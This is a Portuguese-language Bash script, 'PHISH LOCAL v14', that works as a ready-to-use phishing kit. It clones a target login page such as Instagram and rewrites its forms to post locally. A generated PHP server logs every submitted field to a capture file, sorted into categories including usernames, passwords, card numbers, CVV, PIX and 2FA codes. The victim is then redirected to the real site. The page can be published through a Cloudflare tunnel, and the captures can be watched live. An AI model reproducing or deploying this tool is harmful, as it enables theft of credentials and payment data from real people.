#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v14 - Stable Menu + PHP Server
# ============================================

SITE_DIR="site_clone"
LOG_FILE="capturas.txt"
PORT=8080

# Mata servidor anterior
kill_old_server() {
    pkill -f "php -S" 2>/dev/null
    pkill -f "cloudflared" 2>/dev/null
    sleep 1
}

show_menu() {
    clear
    echo ""
    echo "=========================================="
    echo "  🎣 PHISH LOCAL v14"
    echo "=========================================="
    echo ""
    echo "  1) Criar phishing"
    echo "  2) Ver capturas"
    echo "  3) Limpar capturas"
    echo "  4) Sair"
    echo ""
    echo -n "Escolha: "
}

while true; do
    show_menu
    read CHOICE

    case "$CHOICE" in
    1)
        kill_old_server

        echo ""
        echo -n "URL do site (ex: https://instagram.com): "
        read URL
        URL=$(echo "$URL" | tr -d '\r\n' | xargs)
        [ -z "$URL" ] && URL="https://instagram.com"
        if ! echo "$URL" | grep -qE '^https?://'; then
            URL="https://$URL"
        fi
        echo "[!] Alvo: $URL"

        echo ""
        echo -n "URL local (ex: instagram.com): "
        read CUSTOM_URL
        CUSTOM_URL=$(echo "$CUSTOM_URL" | tr -d '\r\n' | xargs | sed 's|https?://||;s|/.*||;s|[^a-zA-Z0-9.-]|-|g')
        [ -z "$CUSTOM_URL" ] && CUSTOM_URL="login"

        echo ""
        echo -n "Redirecionar para (ex: https://instagram.com): "
        read REDIRECT_URL
        REDIRECT_URL=$(echo "$REDIRECT_URL" | tr -d '\r\n' | xargs)
        [ -z "$REDIRECT_URL" ] && REDIRECT_URL="https://instagram.com"
        if ! echo "$REDIRECT_URL" | grep -qE '^https?://'; then
            REDIRECT_URL="https://$REDIRECT_URL"
        fi

        # --- CLONAR ---
        echo ""
        echo "[...] Clonando site..."
        rm -rf "$SITE_DIR"
        mkdir -p "$SITE_DIR"

        USER_AGENT="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"

        curl -skL -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null

        if [ ! -s "$SITE_DIR/index.html" ]; then
            echo "[!] Clone falhou. Usando fallback."
            cat > "$SITE_DIR/index.html" << 'EOF'
<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #ddd;padding:40px;width:350px;text-align:center}h1{margin-bottom:30px;font-weight:400}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:3px;font-size:14px;box-sizing:border-box}button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer}</style>
</head><body><div class="card"><h1>Login</h1><form method="POST"><input type="text" name="username" placeholder="Email" required><input type="password" name="password" placeholder="Senha" required><button type="submit">Entrar</button></form></div></body></html>
EOF
        fi

        # Ajustar forms
        sed -i 's/<form/<form method="POST">/gi' "$SITE_DIR/index.html" 2>/dev/null
        sed -i 's/action="[^"]*"/action=""/gi' "$SITE_DIR/index.html" 2>/dev/null

        echo "[OK] Site clonado! ($(ls "$SITE_DIR" 2>/dev/null | wc -l) arquivos)"

        # --- PEGAR IP ---
        IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
        [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep -v '127.0.0.1' | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1)
        [ -z "$IP" ] && IP="127.0.0.1"

        # --- CLOUDFLARE ---
        CF_INSTALLED=false
        command -v cloudflared &>/dev/null && CF_INSTALLED=true

        echo ""
        echo "=========================================="
        echo "  CLOUDFLARE TUNNEL (Opcional)"
        echo "=========================================="
        echo ""

        CF_CHOICE=2
        if [ "$CF_INSTALLED" = true ]; then
            echo "[OK] Cloudflared instalado!"
            echo ""
            echo "  1) Usar Cloudflare Tunnel"
            echo "  2) Usar so IP local ($IP:$PORT)"
            echo ""
            echo -n "Escolha: "
            read CF_CHOICE
        else
            echo "Sem cloudflared. Usando IP local ($IP:$PORT)"
            sleep 1
        fi

        # --- CRIAR PHP SERVER ---
        cat > server.php << 'PHPEOF'
<?php
$WORDLIST = ["login","signin","sign_in","log_in","entrar","acessar","iniciar","cadastrar","registrar","username","user","email","e-mail","telefone","phone","cpf","cnpj","matricula","identifier","userid","password","senha","pass","passwd","pwd","palavra","chave","secret","pin","codigo","nome","name","fullname","firstname","lastname","sobrenome","social_name","razao_social","mae","pai","data","date","nascimento","birth","birthdate","ano","mes","dia","endereco","rua","avenida","address","street","cep","zip","zipcode","bairro","cidade","pais","country","complemento","empresa","company","trabalho","profissao","escola","universidade","curso","departamento","cargo","cartao","card","credit_card","cvv","validade","conta","banco","agencia","pix","token","otp","verification","captcha","2fa","auth","pergunta","resposta","termos","terms","privacidade","privacy","aceitar","remember","newsletter"];
$REDIRECT = "https://instagram.com";
$LOG_FILE = "capturas.txt";
$SITE_DIR = "site_clone";

function classifyField($name) {
    $name = strtolower(preg_replace('/[^a-z0-9_]/', '', $name));
    foreach ($WORDLIST as $w) {
        if (strpos($name, $w) !== false || strpos($w, $name) !== false) {
            if (preg_match('/login|signin|sign_in|log_in|entrar|acessar|iniciar|cadastrar|registrar|username|user|email|e-mail|telefone|phone|cpf|cnpj|matricula|identifier|userid/', $w)) return 'USUARIO';
            if (preg_match('/password|senha|pass|passwd|pwd|palavra|chave|secret|pin|codigo/', $w)) return 'SENHA';
            if (preg_match('/nome|name|fullname|firstname|lastname|sobrenome|social_name|razao_social|mae|pai/', $w)) return 'NOME';
            if (preg_match('/data|date|nascimento|birth|birthdate|ano|mes|dia/', $w)) return 'DATA';
            if (preg_match('/endereco|rua|avenida|address|street|cep|zip|zipcode|bairro|cidade|pais|country|complemento/', $w)) return 'ENDERECO';
            if (preg_match('/empresa|company|trabalho|profissao|escola|universidade|curso|departamento|cargo|matricula/', $w)) return 'ESCOLA_TRABALHO';
            if (preg_match('/cartao|card|credit_card|cvv|validade|conta|banco|agencia|pix/', $w)) return 'PAGAMENTO';
            if (preg_match('/token|otp|verification|captcha|2fa|auth|pergunta|resposta/', $w)) return 'SEGURANCA';
            if (preg_match('/termos|terms|privacidade|privacy|aceitar|remember|newsletter/', $w)) return 'PREFERENCIA';
            return 'EXTRA';
        }
    }
    return 'OUTRO';
}

$_SERVER['REQUEST_URI'] = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$uri = $_SERVER['REQUEST_URI'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $timestamp = date('Y-m-d H:i:s');
    $classified = array('USUARIO'=>array(),'SENHA'=>array(),'NOME'=>array(),'DATA'=>array(),'ENDERECO'=>array(),'ESCOLA_TRABALHO'=>array(),'PAGAMENTO'=>array(),'SEGURANCA'=>array(),'PREFERENCIA'=>array(),'EXTRA'=>array(),'OUTRO'=>array());
    foreach ($_POST as $k => $v) {
        $cat = classifyField($k);
        $classified[$cat][] = "$k: $v";
    }
    $log = json_encode(array('timestamp'=>$timestamp,'ip'=>$ip,'fields'=>$_POST,'classified'=>$classified))."\n";
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
    header("Location: $REDIRECT");
    exit;
}

if ($uri === '/' || $uri === '') $uri = '/index.html';
$path = realpath($SITE_DIR . $uri);
if ($path && strpos($path, realpath($SITE_DIR)) === 0 && is_file($path)) {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $mime = array('html'=>'text/html','css'=>'text/css','js'=>'application/javascript','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','webp'=>'image/webp','woff'=>'font/woff','woff2'=>'font/woff2');
    header('Content-Type: '.($mime[$ext]??'application/octet-stream'));
    readfile($path);
    exit;
}

header('Content-Type: text/html; charset=UTF-8');
echo '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title>';
echo '<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #ddd;padding:40px;width:350px;text-align:center}h1{margin-bottom:30px;font-weight:400}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:3px;font-size:14px;box-sizing:border-box}button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer}</style>';
echo '</head><body><div class="card"><h1>Login</h1><form method="POST"><input type="text" name="username" placeholder="Email" required><input type="password" name="password" placeholder="Senha" required><button type="submit">Entrar</button></form></div></body></html>';
PHPEOF

        # --- INICIAR SERVIDOR ---
        echo ""
        echo "[*] Iniciando servidor PHP na porta $PORT..."

        php -S 0.0.0.0:$PORT > /tmp/php.log 2>&1 &
        SERVER_PID=$!
        sleep 2

        # Verificar se subiu
        if ! kill -0 $SERVER_PID 2>/dev/null; then
            echo "[ERRO] PHP nao subiu! Log:"
            cat /tmp/php.log
            echo ""
            echo "Pressione ENTER..."
            read
        fi

        # --- CLOUDFLARE ---
        CF_URL=""
        if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
            echo ""
            echo "[...] Criando tunnel..."

            if [ "$IP" != "127.0.0.1" ] && [ -n "$IP" ]; then
                CF_TARGET="http://${IP}:$PORT"
            else
                CF_TARGET="http://localhost:$PORT"
            fi

            cloudflared tunnel --url "$CF_TARGET" > /tmp/cf_tunnel.log 2>&1 &
            CF_PID=$!

            for i in $(seq 1 20); do
                sleep 1
                CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
                [ -n "$CF_URL" ] && break
            done

            [ -n "$CF_URL" ] && echo "[OK] Tunnel criado!" || echo "[AVISO] Tunnel falhou."
        fi

        # --- MOSTRAR RESULTADO ---
        clear
        echo ""
        echo "=========================================="
        echo "         SERVIDOR PRONTO!"
        echo "=========================================="
        echo ""
        if [ -n "$CF_URL" ]; then
            echo "  🔥 URL PUBLICA:"
            echo ""
            echo "    ${CF_URL}"
            echo ""
            echo "  Funciona de QUALQUER lugar!"
        else
            echo "  Acesse na mesma rede Wi-Fi:"
            echo ""
            echo "  🔥 http://${IP}:${PORT}"
            echo ""
            echo "  (URL amigavel: https://${CUSTOM_URL})"
        fi
        echo ""
        echo "  Parar: Ctrl+C"
        echo ""
        echo "=========================================="
        echo ""
        echo "Aguardando capturas..."
        echo ""

        # --- CAPTURAS EM TEMPO REAL ---
        if [ -f "$LOG_FILE" ]; then
            tail -f "$LOG_FILE" 2>/dev/null &
            TAIL_PID=$!
        fi

        # Esperar Ctrl+C
        trap 'echo ""; echo "[OK] Servidor parado!"; kill $SERVER_PID $TAIL_PID $CF_PID 2>/dev/null; sleep 1; wait 2>/dev/null' INT TERM
        wait $SERVER_PID
        kill $TAIL_PID $CF_PID 2>/dev/null
        wait 2>/dev/null

        echo ""
        echo "[OK] Voltando ao menu..."
        sleep 1
        ;;

    2)
        clear
        echo ""
        echo "=========================================="
        echo "  CAPTURAS"
        echo "=========================================="
        echo ""
        if [ -f "$LOG_FILE" ]; then
            cat "$LOG_FILE"
        else
            echo "Nenhuma captura ainda."
        fi
        echo ""
        echo "Pressione ENTER para voltar..."
        read
        ;;

    3)
        > "$LOG_FILE"
        echo "[OK] Capturas limpas!"
        echo ""
        echo "Pressione ENTER para voltar..."
        read
        ;;

    4)
        echo "Saindo..."
        kill_old_server
        exit 0
        ;;

    *)
        echo "Opcao invalida!"
        sleep 1
        ;;
    esac
done
